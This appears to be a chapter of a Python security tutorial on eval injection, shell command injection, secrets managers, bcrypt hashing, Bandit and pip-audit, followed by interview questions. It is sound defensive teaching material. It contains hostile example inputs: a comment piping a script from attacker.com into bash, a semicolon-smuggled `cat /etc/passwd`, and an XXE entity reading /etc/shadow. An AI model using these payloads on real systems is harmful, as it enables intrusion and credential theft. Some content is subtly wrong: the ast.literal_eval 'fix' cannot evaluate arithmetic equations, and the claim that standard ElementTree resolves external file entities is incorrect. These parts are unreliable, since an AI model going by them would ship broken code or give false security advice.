# 22. Security Best Practices — Production Deep Dive

> Platform security is entirely your responsibility. Cloud firewalls don't protect against hardcoded JWTs, OS command injections, or malicious dependency poisoning. Python is uniquely vulnerable to dynamic code execution exploits if developers are naive about serialization, OS wrappers, and eval statements.

---

## 🔍 Code Execution & Injection Vulnerabilities

### The Devastation of `eval()` and `exec()`
These functions execute strings as Python code. If any piece of user input reaches these, the system is compromised instantly.

```python
# THE BUG: Parsing mathematical input from a frontend
def calculate_metric(equation_string):
    # If the user sends: "os.system('curl attacker.com/shell.sh | bash')"
    # The server executes the reverse shell under the app's IAM privileges.
    return eval(equation_string)

# THE FIX: Specialized evaluators
import ast
def safe_calculate(equation_string):
    # ast.literal_eval ONLY evaluates data structures (dict, list, str, tuple, number)
    # It flat-out rejects functional execution and blocks attacks natively.
    return ast.literal_eval(equation_string)
```

### OS Command Injection
Previously discussed under DevOps, but worth reiterating. 

```python
import os
import subprocess

user_file = "my_config.txt; cat /etc/passwd" # Malicious input

# FATAL: the semi-colon breaks the command flow in the shell
os.system(f"cat {user_file}")

# SECURE: By skipping the shell parameter entirely, the OS treats the 
# entire input explicitly as a literal file name. It will correctly fail 
# saying file "my_config.txt; cat /etc/passwd" does not exist.
subprocess.run(["cat", user_file], check=True)
```

---

## 🏭 Secure Configuration Management

### Secrets are not Environment Variables!
Dumping DB passwords into Kubernetes Pod `.env` variables is a terrible pattern. Environment variables are copied into sub-processes. Any compromised third-party library running inside your Python env can instantly scrape `os.environ`.

**The Enterprise Pattern: Secrets Managers**
Your Python app should pull credentials natively from an encrypted vault at runtime.

```python
import boto3
from botocore.exceptions import ClientError
import json

def get_db_secret():
    """Retrieve secrets dynamically from AWS Secrets Manager"""
    client = boto3.client('secretsmanager', region_name='us-east-1')
    try:
        get_secret_value_response = client.get_secret_value(
            SecretId='prod/DatabaseCredentials'
        )
        # Parse the JSON blob returned by the safe cloud architecture
        secret = json.loads(get_secret_value_response['SecretString'])
        return secret['username'], secret['password']
    except ClientError as e:
        raise
```

---

## 🔧 Cryptography & Password Hashing

Never build your own crypto. Never use `md5` or `sha1` for password hashing natively. They are designed to be fast (which makes them trivial to brute force using GPUs).

```python
from passlib.context import CryptContext

# The MLOps API standard for User and Service Account hashes
# bcrypt is designed explicitly to be slow and computationally expensive
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password):
    # The hash implicitly includes a generated salt!
    return pwd_context.hash(password)
```

---

## 🤖 Supply Chain Security (Bandit & Pip-Audit)

Your code isn't the problem. The 50 transitive dependencies your code imported are the problem. 

### Static Vulnerability Scanning (Bandit)
Integrated directly into the CI/CD pipeline, `bandit` scans your AST (Abstract Syntax Tree) for known anti-patterns without actually executing the code.

```bash
# Run against the infrastructure scripts directory
bandit -r scripts/ -c bandit.yaml

# Output Example:
# >> Issue: [B104:hardcoded_bind_all_interfaces] Possible binding to all interfaces.
#    Severity: Medium   Confidence: Medium
#    Location: scripts/server.py:10
```

### Dependency Poisoning (Pip-Audit)
Hackers upload malicious packages to PyPI with names similar to real ones (Typosquatting: e.g., `requests-lib` instead of `requests`). `pip-audit` scans your environment against the official CVE (Common Vulnerabilities and Exposures) database.

```bash
# Ensure your baseline is secure against known published vulnerabilities
pip-audit -r requirements.txt
```

---

## 🎯 Senior Engineer Interview Questions

**Q1: A user uploads an XML document mapping an internal graph network, and you parse it using `xml.etree.ElementTree`. What is an XXE attack, and how is Python vulnerable?**
> **Answer:** XML External Entity (XXE) attacks exploit how XML parsers resolve external definitions. A malicious user injects an entity definition pointing to the local file system (e.g., `<!ENTITY xxe SYSTEM "file:///etc/shadow">`). When the standard Python ElementTree parses the doc, it faithfully reaches out to the OS, reads the shadow file, and embeds the secure system hashes directly into the XML tree, exposing it to the attacker. To secure Python, we must explicitly disable external entity resolution, or use the `defusedxml` package which wraps standard libraries to block malicious entities natively.

**Q2: We need to build a system that securely generates and validates signed tokens for API authorization. What library do we use and what is the underlying cryptography?**
> **Answer:** We use the `PyJWT` library to generate JSON Web Tokens (JWTs). The payload is base64 encoded (visible to everyone), but the token is signed. In symmetric cryptography setups, we utilize HMAC-SHA256 (where both our auth server and API servers share a massive, unguessable secret string). For stricter zero-trust microservice networks, we use Asymmetric encryption like RS256; the Auth server signs the token using a Private Key, and all downstream services validate the signature mathematically using a widely distributed Public Key, preventing them from forging tokens themselves.

**Q3: Describe standard mitigation strategies against Timing Attacks when comparing HMACs or hashed API keys in Python.**
> **Answer:** A timing attack monitors the exact milliseconds it takes an API to reject an unauthorized string. If you use standard `==` to compare strings (`if user_hash == db_hash:`), Python does short-circuit evaluation. It stops evaluating at the *first wrong character*. Hackers use statistical timing discrepancies to guess the password character by character based on precisely when the function returns `False`. The fix is mandatory: always use `hmac.compare_digest(user_hash, db_hash)`. This C-level function takes the exact same amount of compute time regardless of whether it fails on the 1st or the 50th character.

**Q4: In K8s deployments, we run our Python daemon as `USER 1000` (non-root) per security guidelines. We now need the app to bind to port 80 to receive legacy hardware webhooks. However, Python throws a `PermissionError`. Why, and how is this bypassed structurally?**
> **Answer:** Standard Linux OS security prohibits unprivileged users (any UID != 0) from binding to "privileged" ports (0 to 1023). Running the container as root is unacceptable. The structural fix is to bind the Python application to an unprivileged high port (e.g., 8080) and configure the Kubernetes `Service` object to map incoming port 80 traffic down to TargetPort 8080 on the Pod network via iptables/IPVS.

---

[← Previous: Performance](21-performance.md) | [Back to Index](../README.md) | [Next: Design Patterns →](23-design-patterns.md)
